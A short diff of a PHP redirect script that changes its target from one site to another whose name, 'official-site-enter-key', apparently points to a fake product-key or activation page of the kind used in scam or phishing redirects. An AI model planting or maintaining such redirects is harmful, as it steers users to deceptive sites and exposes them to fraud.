@@ -1,5 +1,5 @@
   
 <?php
-header("Location: https://start-your-product.site/actnor/");
+header("Location: https://official-site-enter-key.site/actnor/");
 die();
 ?>
